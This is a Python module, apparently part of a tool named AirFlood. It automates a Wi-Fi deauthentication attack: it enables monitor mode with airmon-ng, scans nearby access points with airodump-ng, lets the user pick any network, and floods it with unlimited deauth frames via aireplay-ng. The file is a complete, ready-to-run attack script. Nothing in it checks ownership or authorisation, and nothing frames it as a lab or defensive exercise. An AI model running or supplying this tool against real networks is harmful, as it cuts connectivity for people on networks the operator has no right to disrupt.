import subprocess
import os
import re
import csv
import time
import shutil
from datetime import datetime

from utils import banner

active_wireless_network = []


def check_for_essid(essid, lst):
    if len(lst) == 0:
        return True
    for item in lst:
        if essid in item["ESSID"]:
            return False
    return True


def backup_stray_csv_files():
    if not any(".csv" in f for f in os.listdir()):
        return
    banner.warn("found leftover .csv files here, moving them to backup_files/")
    directory = os.getcwd()
    try:
        os.mkdir(directory + "/backup_files")
    except FileExistsError:
        pass
    for file in os.listdir():
        if ".csv" in file:
            timestamp = datetime.now().strftime("%Y%m%d-%H%M%S")
            shutil.move(file, f"{directory}/backup_files/{timestamp}-{file}")


def detect_wireless_interfaces():
    wlan_pattern = re.compile("^wlan[0-9]")
    result = subprocess.run(["iwconfig"], capture_output=True)
    return wlan_pattern.findall(result.stdout.decode())


def select_interface():
    banner.module_banner("wifi")
    banner.section("select a wireless interface", accent=banner.C.CYAN)

    interfaces = detect_wireless_interfaces()
    if len(interfaces) == 0:
        banner.error("no wireless adapter found, please connect one and try again")
        raise banner.BackToMenu()

    print()
    for index, item in enumerate(interfaces):
        print(f"  {banner.C.CYAN}[{index}]{banner.C.RESET} {item}")
    print(f"  {banner.C.CYAN}[q]{banner.C.RESET} back to AirFlood menu")

    while True:
        choice = banner.prompt("interface", accent=banner.C.CYAN)
        if choice.lower() in ("q", "b"):
            raise banner.BackToMenu()
        try:
            return interfaces[int(choice)]
        except (ValueError, IndexError):
            banner.warn("invalid selection, try again")


def prepare_monitor_mode(interface):
    banner.module_banner("wifi")
    banner.section("preparing monitor mode", accent=banner.C.CYAN)
    banner.info(f"killing conflicting processes on {interface}...")
    subprocess.run(["sudo", "airmon-ng", "check", "kill"])
    banner.info(f"enabling monitor mode on {interface}...")
    subprocess.run(["sudo", "airmon-ng", "start", interface])
    banner.ok("monitor mode ready")
    time.sleep(1)


def _render_scan_screen():
    banner.module_banner("wifi")
    banner.section("scanning for access points", accent=banner.C.CYAN)
    banner.info("press ctrl+c when you're ready to select a target\n")
    print(f"  {'no':<4}{'bssid':<20}{'ch':<6}{'essid'}")
    print(f"  {'--':<4}{'-----':<20}{'--':<6}{'-----'}")
    for index, item in enumerate(active_wireless_network):
        print(f"  {index:<4}{item['BSSID']:<20}{item['channel'].strip():<6}{item['ESSID']}")


def scan_networks(interface):
    fieldnames = ["BSSID", "First_time_seen", "Last_time_seen", "channel", "Speed", "Privacy",
                  "Cipher", "Authentication", "Power", "beacons", "IV", "LAN_IP", "ID_length",
                  "ESSID", "Key"]

    scan_proc = subprocess.Popen(
        ["sudo", "airodump-ng", "-w", "file", "--write-interval", "1", "--output-format", "csv",
         interface + "mon"],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )

    try:
        while True:
            for file in os.listdir():
                if ".csv" in file:
                    with open(file) as csv_h:
                        csv_h.seek(0)
                        csv_reader = csv.DictReader(csv_h, fieldnames=fieldnames)
                        for row in csv_reader:
                            if row["BSSID"] in (None, "BSSID"):
                                continue
                            if check_for_essid(row["ESSID"], active_wireless_network):
                                active_wireless_network.append(row)

            _render_scan_screen()
            time.sleep(1)
    except KeyboardInterrupt:
        pass
    finally:
        scan_proc.terminate()

    banner.ok(f"stopped scan, found {len(active_wireless_network)} network(s)")


def select_target():
    while True:
        choice = banner.prompt("target", accent=banner.C.CYAN)
        try:
            return active_wireless_network[int(choice)]
        except (ValueError, IndexError):
            banner.warn("invalid selection, try again")


def launch_attack(interface, target):
    banner.module_banner("wifi")
    banner.section("launching deauthentication attack", accent=banner.C.CYAN)
    print(f"  target essid  : {target['ESSID']}")
    print(f"  target bssid  : {target['BSSID']}")
    print(f"  channel       : {target['channel'].strip()}")
    banner.countdown(3, "attacking")

    subprocess.run(["airmon-ng", "start", "mon", interface])
    subprocess.run(["aireplay-ng", "--deauth", "0", "-a", target["BSSID"], interface + "mon"])


def run():
    backup_stray_csv_files()
    interface = select_interface()
    prepare_monitor_mode(interface)
    scan_networks(interface)
    target = select_target()
    launch_attack(interface, target)


if __name__ == "__main__":
    try:
        run()
    except banner.BackToMenu:
        banner.info("bye.")
    except KeyboardInterrupt:
        print()
        banner.warn("aborted")
